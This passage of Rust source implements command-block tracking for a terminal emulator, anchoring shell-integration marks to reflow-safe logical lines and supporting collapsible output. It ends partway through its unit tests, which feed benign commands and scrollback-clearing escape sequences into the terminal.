//! Command blocks: each command, its output and its result.
//!
//! Blocks are built from the shell integration marks (see `marks`). Their
//! positions are stored as *logical lines*: a logical line is a row together
//! with the rows it wraps into. Counting logical lines from the top of the
//! scrollback, instead of rows, keeps positions valid when the window is
//! resized, because reflowing text changes how many rows a line takes but
//! not how many lines there are.

use std::ops::Range;
use std::time::{Duration, Instant};

use alacritty_terminal::Term;
use alacritty_terminal::grid::Dimensions;
use alacritty_terminal::index::{Column, Line, Point};
use alacritty_terminal::term::cell::Flags;

use crate::marks::Mark;

/// Maximum number of blocks kept. Older blocks are forgotten first.
const MAX_BLOCKS: usize = 10_000;

/// Number of old blocks forgotten at once when [`MAX_BLOCKS`] is exceeded.
const FORGET_BATCH: usize = 1_000;

/// Longest walk over wrapped rows when locating the start of a logical
/// line. A shell's prompt never sits this deep inside a wrapped line.
const MAX_WALK_ROWS: i32 = 256;

/// Most rows a command line may span for its text to be read.
const MAX_COMMAND_ROWS: usize = 100;

/// Most characters of a command line returned when its text is read.
const MAX_COMMAND_CHARS: usize = 4_096;

/// Most cells checked, when a command is submitted, to tell whether
/// anything was typed. The check runs for every mark, so it is bounded.
const TYPED_CHECK_CELLS: usize = 512;

/// Where a block is in its life cycle.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum BlockState {
    /// The prompt is shown and the user is typing a command.
    Prompt,
    /// The command is running.
    Running,
    /// The command finished.
    Finished,
}

/// One command and its output.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Block {
    id: u64,
    prompt: Anchor,
    input: Option<Anchor>,
    output: Option<Anchor>,
    end: Option<Anchor>,
    /// Something was typed between the prompt and the output.
    typed: bool,
    exit_code: Option<i32>,
    started_at: Option<Instant>,
    duration: Option<Duration>,
    collapsed: bool,
}

impl Block {
    fn new(id: u64, prompt: Anchor) -> Self {
        Self {
            id,
            prompt,
            input: None,
            output: None,
            end: None,
            typed: false,
            exit_code: None,
            started_at: None,
            duration: None,
            collapsed: false,
        }
    }

    /// Identifier of the block, unique within its terminal and stable while
    /// the block exists, unlike its position in the list.
    pub fn id(&self) -> u64 {
        self.id
    }

    fn anchors(&self) -> impl Iterator<Item = Anchor> {
        [Some(self.prompt), self.input, self.output, self.end]
            .into_iter()
            .flatten()
    }

    /// Returns where the block is in its life cycle.
    pub fn state(&self) -> BlockState {
        match (self.output, self.end) {
            (_, Some(_)) => BlockState::Finished,
            (Some(_), None) => BlockState::Running,
            (None, None) => BlockState::Prompt,
        }
    }

    /// Exit code of the command, once it finished, if the shell reported one.
    pub fn exit_code(&self) -> Option<i32> {
        self.exit_code
    }

    /// When the command was submitted.
    pub fn started_at(&self) -> Option<Instant> {
        self.started_at
    }

    /// How long the command ran, once it finished.
    pub fn duration(&self) -> Option<Duration> {
        self.duration
    }

    /// Whether the block's output is collapsed in the view.
    pub fn is_collapsed(&self) -> bool {
        self.collapsed
    }
}

/// Rows a block spans, counted from the top of the scrollback: row 0 is the
/// oldest line kept in history.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct BlockRows {
    /// First row of the prompt.
    pub prompt: usize,
    /// First row of the output, once the command was submitted.
    pub output: Option<usize>,
    /// Row where the command finished, which is usually where the next
    /// prompt starts.
    pub end: Option<usize>,
}

/// A block as it appears in the current view, for drawing.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ScreenBlock {
    /// Identifier of the block ([`Block::id`]).
    pub id: u64,
    /// Screen row of the prompt, if it is in view.
    pub prompt_row: Option<usize>,
    /// Screen rows the block covers, clipped to the view: from its prompt
    /// up to the row where the next prompt starts.
    pub rows: Range<usize>,
    /// Where the block is in its life cycle.
    pub state: BlockState,
    /// Exit code, once the command finished and the shell reported one.
    pub exit_code: Option<i32>,
    /// How long the command ran, once it finished.
    pub duration: Option<Duration>,
    /// The block's output is collapsed into one summary row.
    pub collapsed: bool,
}

/// One row of the view: a grid line, a summary standing for the hidden
/// output of a collapsed block, or nothing (when there is not enough text
/// to fill the view).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum ViewLine {
    Grid(i32),
    Folded {
        /// First grid line hidden behind the summary.
        first: i32,
        /// Number of grid lines hidden.
        hidden: usize,
    },
    Blank,
}

impl ViewLine {
    /// The grid line this row stands for, if any.
    pub(crate) fn line(self) -> Option<i32> {
        match self {
            Self::Grid(line) | Self::Folded { first: line, .. } => Some(line),
            Self::Blank => None,
        }
    }
}

/// Where an anchor is relative to the view.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum InView {
    Above,
    Row(usize),
    Below,
}

/// A position in the scrollback that survives reflow. Anchors compare by
/// logical line, then by offset: the order they appear in the text.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
struct Anchor {
    /// Logical line, counted from the top of the scrollback.
    line: usize,
    /// Cell offset within the logical line.
    offset: usize,
}

/// The blocks of a terminal, oldest first.
///
/// Marks can come from any program, so every operation triggered by a mark
/// costs at most a walk over the visible screen plus a bounded number of
/// rows, never over the whole scrollback (ADR 0012).
#[derive(Debug, Default)]
pub(crate) struct BlockList {
    blocks: Vec<Block>,
    /// Number of logical lines that end in the scrollback above the screen,
    /// that is, the logical line of the first screen row. Kept up to date
    /// incrementally by the owner as rows scroll into or out of history.
    history_lines: usize,
    /// Identifier given to the last block created.
    next_id: u64,
}

impl BlockList {
    pub(crate) fn as_slice(&self) -> &[Block] {
        &self.blocks
    }

    /// Updates the blocks for a mark received with the cursor at its
    /// current position.
    pub(crate) fn apply<T>(&mut self, mark: Mark, term: &Term<T>, now: Instant) {
        let cursor = term.grid().cursor.point;
        // Marks inside an unusually long wrapped line cannot be anchored
        // cheaply; they are ignored, as a shell never prints its prompt there.
        let Some(anchor) = anchor_at(term, cursor, self.history_lines) else {
            return;
        };
        match mark {
            // Handled by the terminal, which owns the history.
            Mark::HistoryCleared | Mark::SequenceTooLong => {}
            Mark::PromptStart => {
                // A prompt that never ran a command (for example after
                // Ctrl+C at the prompt) is replaced.
                if self
                    .blocks
                    .last()
                    .is_some_and(|block| block.state() == BlockState::Prompt)
                {
                    self.blocks.pop();
                }
                // A running command that never reported its end is closed,
                // never before its own output.
                if let Some(block) = self.current(BlockState::Running) {
                    block.end = block.output.max(Some(anchor));
                }
                // Blocks that extend past the new prompt were overwritten
                // (for example by output inside a scroll region, which moves
                // text without sending it to the scrollback). Blocks are kept
                // in order, so they are all at the end of the list.
                while self
                    .blocks
                    .last()
                    .is_some_and(|block| block.anchors().any(|other| other > anchor))
                {
                    self.blocks.pop();
                }
                self.next_id += 1;
                self.blocks.push(Block::new(self.next_id, anchor));
                if self.blocks.len() > MAX_BLOCKS {
                    // Forget old blocks in batches, so the cost of shifting
                    // the list is spread over many new blocks.
                    self.blocks.drain(..FORGET_BATCH);
                }
            }
            // A mark can only move forward from the block's previous one.
            // Marks that would point backwards (forged output, or a screen
            // rewritten between marks) are ignored, so a block's anchors are
            // always in order.
            Mark::CommandStart => {
                if let Some(block) = self.current(BlockState::Prompt)
                    && anchor >= block.prompt
                {
                    block.input = Some(anchor);
                }
            }
            Mark::OutputStart => {
                if let Some(block) = self.current(BlockState::Prompt)
                    && anchor >= block.input.unwrap_or(block.prompt)
                {
                    // Only whether something was typed is checked here, in
                    // bounded time; the text itself is read when asked for,
                    // from what is displayed then (`command_text`).
                    let start = block.input.unwrap_or(block.prompt);
                    block.typed = typed_before(term, start, cursor, anchor);
                    block.output = Some(anchor);
                    block.started_at = Some(now);
                }
            }
            Mark::CommandFinished(code) => {
                let Some(block) = self.current(BlockState::Running) else {
                    return;
                };
                if block.output.is_some_and(|output| anchor < output) {
                    return;
                }
                if !block.typed {
                    // Submitting an empty line is not a command.
                    self.blocks.pop();
                    return;
                }
                block.end = Some(anchor);
                block.exit_code = code;
                block.duration = block.started_at.map(|start| now - start);
            }
        }
    }

    /// Accounts for `lines` logical lines removed from the top of the
    /// scrollback. Blocks whose prompt was removed are forgotten.
    pub(crate) fn remove_top_lines(&mut self, lines: usize) {
        if lines == 0 {
            return;
        }
        self.history_lines = self.history_lines.saturating_sub(lines);
        // A block is kept only if every anchor survives, so no position can
        // go below zero even if the anchors were ever out of order.
        self.blocks
            .retain(|block| block.anchors().all(|anchor| anchor.line >= lines));
        for block in &mut self.blocks {
            for anchor in [
                Some(&mut block.prompt),
                block.input.as_mut(),
                block.output.as_mut(),
                block.end.as_mut(),
            ]
            .into_iter()
            .flatten()
            {
                anchor.line -= lines;
            }
        }
    }

    /// Forgets every block, for when positions can no longer be trusted.
    pub(crate) fn clear(&mut self) {
        self.blocks.clear();
    }

    /// Counts the logical lines in the scrollback from scratch, after the
    /// history was reflowed or cleared. Linear in the history size, so it is
    /// only used for events the user causes, not for output.
    pub(crate) fn recount_history<T>(&mut self, term: &Term<T>) {
        self.history_lines = line_starts_in_top_rows(term, term.grid().history_size());
    }

    /// Accounts for `rows` rows that just scrolled from the screen into the
    /// scrollback.
    pub(crate) fn history_grew<T>(&mut self, term: &Term<T>, rows: usize) {
        self.history_lines += (-(rows as i32)..0)
            .filter(|&row| !wraps(term, Line(row)))
            .count();
    }

    /// Returns the id of the last block if the shell is waiting for its
    /// command with an empty line: the command start mark was received, no
    /// output started, and the cursor is still where the input starts.
    /// Costs at most a walk over the screen.
    pub(crate) fn awaiting_command<T>(&self, term: &Term<T>) -> Option<u64> {
        let block = self.blocks.last()?;
        let input = block.input?;
        if block.state() != BlockState::Prompt {
            return None;
        }
        let cursor = anchor_at(term, term.grid().cursor.point, self.history_lines)?;
        (cursor == input).then_some(block.id)
    }

    /// Returns the id of the last block if the shell is at its prompt, past
    /// the command start mark and before any output, wherever the cursor is.
    pub(crate) fn command_prompt(&self) -> Option<u64> {
        let block = self.blocks.last()?;
        (block.state() == BlockState::Prompt && block.input.is_some()).then_some(block.id)
    }

    /// The block with identifier `id`, if it still exists. Blocks are kept in
    /// creation order, so identifiers are sorted.
    pub(crate) fn get(&self, id: u64) -> Option<&Block> {
        let index = self
            .blocks
            .binary_search_by_key(&id, |block| block.id)
            .ok()?;
        self.blocks.get(index)
    }

    /// The command line of block `id` as it is displayed now: hidden cells
    /// are not copied, and the text is limited in length. Read on request,
    /// since output can redraw the line after the command was submitted.
    pub(crate) fn command_text<T>(&self, term: &Term<T>, id: u64) -> Option<String> {
        let block = self.get(id)?;
        let start = point_of(
            term,
            block.input.unwrap_or(block.prompt),
            self.history_lines,
        )?;
        let end = point_of(term, block.output?, self.history_lines)?;
        let max_cells = MAX_COMMAND_ROWS * term.grid().columns();
        let text: String = displayed_text(term, start, end, max_cells)
            .chars()
            .take(MAX_COMMAND_CHARS)
            .collect();
        (!text.is_empty()).then_some(text)
    }

    /// Collapses or expands the output of block `id`. Only finished blocks
    /// with at least two lines of output can be collapsed: folding a single
    /// line behind a summary saves nothing. Returns the new state, or `None`
    /// if the block cannot be collapsed.
    pub(crate) fn toggle_collapsed(&mut self, id: u64) -> Option<bool> {
        let index = self
            .blocks
            .binary_search_by_key(&id, |block| block.id)
            .ok()?;
        let block = self.blocks.get_mut(index)?;
        let (Some(output), Some(end)) = (block.output, block.end) else {
            return None;
        };
        if end.line < output.line + 2 {
            return None;
        }
        block.collapsed = !block.collapsed;
        Some(block.collapsed)
    }

    /// Grid lines hidden by collapsed blocks, as sorted, non-overlapping
    /// `[first, end)` ranges, found in one walk over the grid.
    pub(crate) fn folds<T>(&self, term: &Term<T>) -> Vec<(i32, i32)> {
        let collapsed: Vec<&Block> = self.blocks.iter().filter(|block| block.collapsed).collect();
        if collapsed.is_empty() {
            return Vec::new();
        }
        let anchors: Vec<Anchor> = collapsed
            .iter()
            .flat_map(|block| [block.output, block.end])
            .flatten()
            .collect();
        let lines = anchor_lines(term, &anchors);
        let mut folds = Vec::with_capacity(collapsed.len());
        let mut next = 0;
        for block in collapsed {
            let (Some(_), Some(_)) = (block.output, block.end) else {
                next += usize::from(block.output.is_some()) + usize::from(block.end.is_some());
                continue;
            };
            if let (Some(first), Some(end)) = (lines[next], lines[next + 1]) {
                // Hiding a single line behind a summary saves nothing.
                if end - first > 1 && folds.last().is_none_or(|&(_, last)| first >= last) {
                    folds.push((first, end));
                }
            }
            next += 2;
        }
        folds
    }

    /// Returns the rows of the view, top to bottom: grid lines, with the
    /// output of collapsed blocks replaced by one summary row each.
    ///
    /// At the bottom of the scrollback the view ends at the last line, so the
    /// latest output stays visible, and lines from above fill the space
    /// folds leave. Scrolled back, the view starts at its top line instead,
    /// so a block jumped to is shown from its prompt.
    pub(crate) fn view<T>(&self, term: &Term<T>) -> Vec<ViewLine> {
        let grid = term.grid();
        let rows = grid.screen_lines();
        let offset = grid.display_offset() as i32;
        let folds = self.folds(term);
        if folds.is_empty() {
            return (-offset..rows as i32 - offset)
                .map(ViewLine::Grid)
                .collect();
        }
        let topmost = grid.topmost_line().0;
        let bottommost = grid.bottommost_line().0;
        let fold_at = |line: i32| fold_containing(&folds, line);
        let entry = |(first, end): (i32, i32)| ViewLine::Folded {
            first,
            hidden: (end - first) as usize,
        };

        // Lines going down from `start`, and going up from it.
        let mut below = Vec::with_capacity(rows);
        let mut above = Vec::with_capacity(rows);
        let start = if offset == 0 {
            bottommost + 1
        } else {
            let top = -offset;
            fold_at(top).map_or(top, |(first, _)| first)
        };
        let mut line = start;
        while below.len() < rows && line <= bottommost {
            if let Some(fold) = fold_at(line) {
                below.push(entry(fold));
                line = fold.1;
            } else {
                below.push(ViewLine::Grid(line));
                line += 1;
            }
        }
        let mut line = start - 1;
        while below.len() + above.len() < rows && line >= topmost {
            if let Some(fold) = fold_at(line) {
                above.push(entry(fold));
                line = fold.0 - 1;
            } else {
                above.push(ViewLine::Grid(line));
                line -= 1;
            }
        }
        above.reverse();
        above.extend(below);
        above.resize(rows, ViewLine::Blank);
        above
    }

    /// The display offset after scrolling the view `lines` rows (positive is
    /// up, towards older output), counting each fold as one row. `None` when
    /// nothing is collapsed, so scrolling works on grid lines as usual.
    pub(crate) fn scroll_offset_after<T>(&self, term: &Term<T>, lines: i32) -> Option<usize> {
        let folds = self.folds(term);
        if folds.is_empty() {
            return None;
        }
        let grid = term.grid();
        let rows = grid.screen_lines();
        let topmost = grid.topmost_line().0;
        let bottommost = grid.bottommost_line().0;
        let view = self.view(term);
        let mut top = view.iter().find_map(|entry| entry.line()).unwrap_or(0);
        for _ in 0..lines.unsigned_abs() {
            let next = if lines > 0 {
                let line = top - 1;
                fold_containing(&folds, line).map_or(line, |(first, _)| first)
            } else {
                fold_containing(&folds, top).map_or(top + 1, |(_, end)| end)
            };
            if next < topmost || next > bottommost {
                break;
            }
            top = next;
        }
        // Once the rest of the scrollback fits below the top line, the view is
        // back at the bottom.
        let mut remaining = 0;
        let mut line = top;
        while line <= bottommost && remaining <= rows {
            line = fold_containing(&folds, line).map_or(line + 1, |(_, end)| end);
            remaining += 1;
        }
        Some(if remaining <= rows {
            0
        } else {
            (-top).max(0) as usize
        })
    }

    /// Returns the blocks that appear in `view`, oldest first.
    ///
    /// Costs one walk over the rows between the view and the screen plus
    /// the view itself, whatever the number of blocks: this runs for every
    /// frame (ADR 0013).
    pub(crate) fn visible<T>(&self, term: &Term<T>, view: &[ViewLine]) -> Vec<ScreenBlock> {
        if self.blocks.is_empty() {
            return Vec::new();
        }
        let grid = term.grid();
        let columns = grid.columns().max(1);
        // Logical line of each row in the view; blank rows repeat the last.
        let logical_of = |line: i32| -> usize {
            if line >= 0 {
                self.history_lines + (0..line).filter(|&row| !wraps(term, Line(row))).count()
            } else {
                self.history_lines
                    .saturating_sub((line..0).filter(|&row| !wraps(term, Line(row))).count())
            }
        };
        let mut row_lines = Vec::with_capacity(view.len());
        let mut previous: Option<(i32, usize)> = None;
        for entry in view {
            let Some(line) = entry.line() else {
                row_lines.push(previous.map_or(0, |(_, logical)| logical + 1));
                continue;
            };
            let logical = match previous {
                Some((before, logical)) if line > before => {
                    logical
                        + (before..line)
                            .filter(|&row| !wraps(term, Line(row)))
                            .count()
                }
                _ => logical_of(line),
            };
            row_lines.push(logical);
            previous = Some((line, logical));
        }
        let (Some(&first), Some(&last)) = (row_lines.first(), row_lines.last()) else {
            return Vec::new();
        };
        let view_rows = view.len();
        let locate = |anchor: Anchor| {
            if anchor.line < first {
                InView::Above
            } else if anchor.line > last {
                InView::Below
            } else {
                // The first row of the logical line, then its wrapped rows.
                let start = row_lines.partition_point(|&l| l < anchor.line);
                let wrapped = anchor.offset / columns;
                let rows_of_line = row_lines[start..].partition_point(|&l| l == anchor.line);
                InView::Row(start + wrapped.min(rows_of_line.saturating_sub(1)))
            }
        };

        let mut visible = Vec::new();
        for block in self.blocks.iter().rev() {
            let end = block.end.map(locate);
            if end == Some(InView::Above) {
                break;
            }
            let (start, prompt_row) = match locate(block.prompt) {
                InView::Above => (0, None),
                InView::Row(row) => (row, Some(row)),
                InView::Below => continue,
            };
            let stop = match end {
                Some(InView::Row(row)) => row.max(start + 1),
                _ => view_rows,
            };
            visible.push(ScreenBlock {
                id: block.id,
                prompt_row,
                rows: start..stop.min(view_rows),
                state: block.state(),
                exit_code: block.exit_code,
                duration: block.duration,
                collapsed: block.collapsed,
            });
        }
        visible.reverse();
        visible
    }

    /// Returns the row of every block's prompt, counted from the top of the
    /// scrollback, in one walk over the grid.
    pub(crate) fn prompt_rows<T>(&self, term: &Term<T>) -> Vec<usize> {
        let grid = term.grid();
        let top = grid.topmost_line().0;
        let mut rows = Vec::with_capacity(self.blocks.len());
        let mut prompts = self.blocks.iter().map(|block| block.prompt.line).peekable();
        let mut line = 0;
        for (absolute, row) in (top..=grid.bottommost_line().0).enumerate() {
            while prompts.peek().is_some_and(|&prompt| prompt == line) {
                rows.push(absolute);
                prompts.next();
            }
            if prompts.peek().is_none() {
                break;
            }
            if !wraps(term, Line(row)) {
                line += 1;
            }
        }
        rows
    }

    /// Returns the rows of `block` in the current grid.
    pub(crate) fn rows<T>(&self, term: &Term<T>, block: &Block) -> Option<BlockRows> {
        let history = term.grid().history_size();
        let absolute = |point: Point| (point.line.0 + history as i32) as usize;
        let row = |anchor: Option<Anchor>| {
            anchor
                .and_then(|a| point_of(term, a, self.history_lines))
                .map(absolute)
        };
        Some(BlockRows {
            prompt: row(Some(block.prompt))?,
            output: row(block.output),
            end: row(block.end),
        })
    }

    fn current(&mut self, state: BlockState) -> Option<&mut Block> {
        self.blocks
            .last_mut()
            .filter(|block| block.state() == state)
    }
}

/// Counts the logical lines that start in the `rows` topmost rows of the
/// scrollback.
pub(crate) fn line_starts_in_top_rows<T>(term: &Term<T>, rows: usize) -> usize {
    let top = term.grid().topmost_line().0;
    (top..top + rows as i32)
        .filter(|&row| !wraps(term, Line(row)))
        .count()
}

/// Whether `row` continues on the next row.
fn wraps<T>(term: &Term<T>, row: Line) -> bool {
    let grid = term.grid();
    grid[row][Column(grid.columns() - 1)]
        .flags
        .contains(Flags::WRAPLINE)
}

/// Walks up from `row` over the rows that wrap into it and returns the first
/// row of its logical line, or `None` if that takes more than
/// [`MAX_WALK_ROWS`] rows.
fn first_row_of_line<T>(term: &Term<T>, mut row: i32) -> Option<i32> {
    let top = term.grid().topmost_line().0;
    let mut steps = 0;
    while row > top && wraps(term, Line(row - 1)) {
        steps += 1;
        if steps > MAX_WALK_ROWS {
            return None;
        }
        row -= 1;
    }
    Some(row)
}

/// Converts a point on the screen into an anchor, given the number of
/// logical lines in the scrollback above the screen. Costs a walk over the
/// screen rows above the point plus at most [`MAX_WALK_ROWS`] rows.
fn anchor_at<T>(term: &Term<T>, point: Point, history_lines: usize) -> Option<Anchor> {
    let columns = term.grid().columns();
    let line = history_lines
        + (0..point.line.0)
            .filter(|&row| !wraps(term, Line(row)))
            .count();
    let first = first_row_of_line(term, point.line.0)?;
    let rows_into_line = (point.line.0 - first) as usize;
    Some(Anchor {
        line,
        offset: rows_into_line * columns + point.column.0,
    })
}

/// Converts an anchor back into a grid point, if it is still in the grid.
///
/// Anchors on the screen cost a walk over the screen; anchors in the
/// scrollback cost a walk from its top, so this is only used for drawing,
/// never in response to output.
fn point_of<T>(term: &Term<T>, anchor: Anchor, history_lines: usize) -> Option<Point> {
    let grid = term.grid();
    let bottom = grid.bottommost_line().0;
    let (mut line, mut row) = if anchor.line >= history_lines {
        (history_lines, 0)
    } else {
        (0, grid.topmost_line().0)
    };
    while line < anchor.line {
        if row > bottom {
            return None;
        }
        if !wraps(term, Line(row)) {
            line += 1;
        }
        row += 1;
    }
    // On the screen, the logical line may have started in the scrollback.
    let row = first_row_of_line(term, row)?;
    offset_point(term, row, anchor.offset)
}

/// Returns the point `offset` cells into the logical line starting at `row`.
fn offset_point<T>(term: &Term<T>, mut row: i32, mut offset: usize) -> Option<Point> {
    let grid = term.grid();
    let columns = grid.columns();
    let bottom = grid.bottommost_line().0;
    while offset >= columns && row < bottom && wraps(term, Line(row)) {
        offset -= columns;
        row += 1;
    }
    (row <= bottom).then(|| Point::new(Line(row), Column(offset.min(columns - 1))))
}

/// The fold containing grid `line`, if any. `folds` is sorted and does not
/// overlap, so a binary search finds it.
fn fold_containing(folds: &[(i32, i32)], line: i32) -> Option<(i32, i32)> {
    let after = folds.partition_point(|&(first, _)| first <= line);
    let &(first, end) = folds.get(after.checked_sub(1)?)?;
    (line >= first && line < end).then_some((first, end))
}

/// Grid lines of `anchors`, which must be sorted, in one walk from the top
/// of the scrollback: the cost is the history plus the anchors, however
/// many anchors there are.
fn anchor_lines<T>(term: &Term<T>, anchors: &[Anchor]) -> Vec<Option<i32>> {
    let grid = term.grid();
    let mut lines = vec![None; anchors.len()];
    let mut next = 0;
    let mut line = 0;
    for row in grid.topmost_line().0..=grid.bottommost_line().0 {
        while next < anchors.len() && anchors[next].line < line {
            next += 1;
        }
        while next < anchors.len() && anchors[next].line == line {
            lines[next] = offset_point(term, row, anchors[next].offset).map(|point| point.line.0);
            next += 1;
        }
        if next == anchors.len() {
            break;
        }
        if !wraps(term, Line(row)) {
            line += 1;
        }
    }
    lines
}

/// Finds the point of `start`, walking up from `end` (whose anchor is
/// `end_anchor`) at most [`MAX_COMMAND_ROWS`] rows, so the cost stays bounded
/// whatever the output did before.
fn point_before<T>(term: &Term<T>, start: Anchor, end: Point, end_anchor: Anchor) -> Option<Point> {
    if start.line > end_anchor.line {
        return None;
    }
    let top = term.grid().topmost_line().0;
    // Walk up to the first row of the start's logical line.
    let mut row = end.line.0;
    let mut line = end_anchor.line;
    let mut steps = 0;
    while line > start.line || (row > top && wraps(term, Line(row - 1))) {
        if row <= top || steps >= MAX_COMMAND_ROWS {
            return None;
        }
        row -= 1;
        steps += 1;
        if !wraps(term, Line(row)) {
            line -= 1;
        }
    }
    offset_point(term, row, start.offset).filter(|&point| point < end)
}

/// Whether anything visible was typed between `start` and `end`, the
/// cursor position whose anchor is `end_anchor`. Checks at most
/// [`TYPED_CHECK_CELLS`] cells, since it runs for every mark.
fn typed_before<T>(term: &Term<T>, start: Anchor, end: Point, end_anchor: Anchor) -> bool {
    point_before(term, start, end, end_anchor)
        .is_some_and(|start| !displayed_text(term, start, end, TYPED_CHECK_CELLS).is_empty())
}

/// The text of the cells from `start` up to (not including) `end` as it is
/// displayed: hidden cells read as spaces and wide-character spacers are
/// skipped, a row that does not wrap ends a line, and each line loses its
/// trailing spaces. Reads at most `max_cells` cells; the result is trimmed.
fn displayed_text<T>(term: &Term<T>, start: Point, end: Point, max_cells: usize) -> String {
    let grid = term.grid();
    let columns = grid.columns();
    let mut text = String::new();
    let mut cells = 0;
    let mut point = start;
    while point < end && cells < max_cells {
        let row = &grid[point.line];
        let last = if point.line == end.line {
            end.column.0
        } else {
            columns
        };
        let mut line = String::new();
        for col in point.column.0..last {
            cells += 1;
            let cell = &row[Column(col)];
            if cell
                .flags
                .intersects(Flags::WIDE_CHAR_SPACER | Flags::LEADING_WIDE_CHAR_SPACER)
            {
                continue;
            }
            if cell.flags.contains(Flags::HIDDEN) {
                line.push(' ');
            } else {
                line.push(cell.c);
                if let Some(extra) = cell.zerowidth() {
                    line.extend(extra);
                }
            }
            if cells >= max_cells {
                break;
            }
        }
        let wrapped = point.line < end.line && wraps(term, point.line);
        if wrapped {
            text.push_str(&line);
        } else {
            text.push_str(line.trim_end());
            if point.line < end.line {
                text.push('\n');
            }
        }
        point = Point::new(point.line + 1, Column(0));
    }
    text.trim().to_owned()
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::{Terminal, TerminalSize};

    const A: &str = "\x1b]133;A\x07";
    const B: &str = "\x1b]133;B\x07";
    const C: &str = "\x1b]133;C\x07";

    fn d(code: i32) -> String {
        format!("\x1b]133;D;{code}\x07")
    }

    /// Output of a shell running `command`, which prints `output`, exits
    /// with `code` and shows the next prompt.
    fn run(command: &str, output: &str, code: i32) -> String {
        format!("{A}$ {B}{command}\r\n{C}{output}{}{A}$ {B}", d(code))
    }

    fn terminal(rows: u16, cols: u16, output: &str) -> Terminal {
        let mut term = Terminal::new(TerminalSize::new(rows, cols));
        term.advance(output.as_bytes());
        term
    }

    #[test]
    fn tracks_a_command_and_its_output() {
        let term = terminal(10, 40, &run("ls -la", "one\r\ntwo\r\n", 0));
        let blocks = term.blocks();

        assert_eq!(blocks.len(), 2);
        let block = &blocks[0];
        assert_eq!(block.state(), BlockState::Finished);
        assert_eq!(term.block_command(block.id()).as_deref(), Some("ls -la"));
        assert_eq!(block.exit_code(), Some(0));
        assert!(block.duration().is_some());
        assert_eq!(
            term.block_rows(block),
            Some(BlockRows {
                prompt: 0,
                output: Some(1),
                end: Some(3)
            })
        );
        assert_eq!(blocks[1].state(), BlockState::Prompt);
    }

    #[test]
    fn reports_running_and_failed_commands() {
        let mut term = terminal(10, 40, &format!("{A}$ {B}make\r\n{C}building\r\n"));
        assert_eq!(term.blocks()[0].state(), BlockState::Running);
        assert_eq!(term.blocks()[0].duration(), None);

        term.advance(format!("{}{A}$ {B}", d(2)).as_bytes());
        assert_eq!(term.blocks()[0].exit_code(), Some(2));

        term.advance(format!("x\r\n{C}\x1b]133;D\x07{A}$ {B}").as_bytes());
        assert_eq!(term.blocks()[1].exit_code(), None);
        assert_eq!(term.blocks()[1].state(), BlockState::Finished);
    }

    #[test]
    fn empty_commands_and_abandoned_prompts_are_not_blocks() {
        let empty = run("", "", 0);
        let interrupted = format!("{A}$ {B}half typed^C\r\n{A}$ {B}");
        for output in [empty, interrupted] {
            let term = terminal(10, 40, &output);
            assert_eq!(term.blocks().len(), 1, "{output:?}");
            assert_eq!(term.blocks()[0].state(), BlockState::Prompt);
        }
    }

    #[test]
    fn positions_survive_reflow() {
        let long = "x".repeat(25);
        let mut term = terminal(6, 10, &run("cmd", &format!("{long}\r\n"), 0));
        let rows = term.block_rows(&term.blocks()[1]).expect("rows");
        assert_eq!(rows.prompt, 4, "25 characters take three rows of 10");

        term.resize(TerminalSize::new(6, 30));
        let rows = term.block_rows(&term.blocks()[1]).expect("rows");
        assert_eq!(rows.prompt, 2, "and one row of 30");
        assert_eq!(term.screen_lines()[2], "$");
    }

    #[test]
    fn follows_history_trimming() {
        let lines = crate::terminal::HISTORY_LINES + crate::terminal::TRIM_SLACK + 500;
        let flood = "line\r\n".repeat(lines);
        let mut output = run("flood", &flood, 0);
        output.push_str(&format!("last\r\n{C}done\r\n{}{A}$ {B}", d(0)));
        let term = terminal(5, 20, &output);

        // The first block's prompt left the history; the second remains.
        let blocks = term.blocks();
        assert_eq!(blocks.len(), 2);
        assert_eq!(term.block_command(blocks[0].id()).as_deref(), Some("last"));
        let rows = term.block_rows(&blocks[0]).expect("rows");
        let screen_row = rows.prompt - term.history_size();
        assert_eq!(term.screen_lines()[screen_row], "$ last");
    }

    #[test]
    fn clearing_the_history_forgets_blocks() {
        let mut term = terminal(3, 20, &run("ls", "a\r\nb\r\nc\r\nd\r\n", 0));
        assert_eq!(term.blocks().len(), 2);

        term.advance(b"\x1b[H\x1b[2J\x1b[3J");
        assert!(term.blocks().is_empty());
    }

    /// Any program can print marks, so a flood of them must stay cheap even
    /// with a full scrollback. Each mark used to walk the whole history.
    #[test]
    fn a_flood_of_marks_stays_cheap() {
        let mut term = Terminal::new(TerminalSize::new(24, 80));
        term.advance("line\r\n".repeat(crate::terminal::HISTORY_LINES).as_bytes());
        let flood = format!("{A}$ {B}x\r\n{C}").repeat(20_000);

        let start = std::time::Instant::now();
        term.advance(flood.as_bytes());
        let elapsed = start.elapsed();

        assert!(
            elapsed < std::time::Duration::from_secs(2),
            "60,000 marks took {elapsed:?}"
        );
        assert!(term.blocks().len() <= MAX_BLOCKS);
    }

    /// Clearing the history and refilling it within one read used to go
    /// unnoticed, leaving block positions out of step with the grid until a
    /// later trim subtracted past zero.
    #[test]
    fn clearing_and_refilling_the_history_at_once_is_noticed() {
        // Every form the emulator accepts: control characters inside the
        // escape sequence are executed without ending it, and only the first
        // parameter of `CSI J` counts.
        for clear in [
            "\x1b[3J",
            "\x1bc",
            "\x1b\x00c",
            "\x1b\r[3J",
            "\x1b\x7fc",
            "\x1b\x7f[3J",
            "\x1b\u{80}c",
            "\x1b\u{ff}[3J",
            "\x1b[03J",
            "\x1b[3;J",
            "\x1b[3:1J",
            "\x1b[?2026h\x1b[3J",
        ] {
            let mut term = terminal(5, 2, &"\r\n".repeat(300));
            term.advance(format!("{clear}{}{}", "x".repeat(700), "\r\n".repeat(10)).as_bytes());
            term.advance(format!("{A}$ {B}").as_bytes());

            // The prompt is anchored where it really is, also after a resize
            // recounts the history from scratch.
            let prompt_line = |term: &Terminal| {
                let block = term.blocks().last()?;
                let rows = term.block_rows(block)?;
                let row = rows.prompt.checked_sub(term.history_size())?;
                term.screen_lines().get(row).cloned()
            };
            assert_eq!(prompt_line(&term).as_deref(), Some("$"), "{clear:?}");
            term.resize(TerminalSize::new(5, 3));
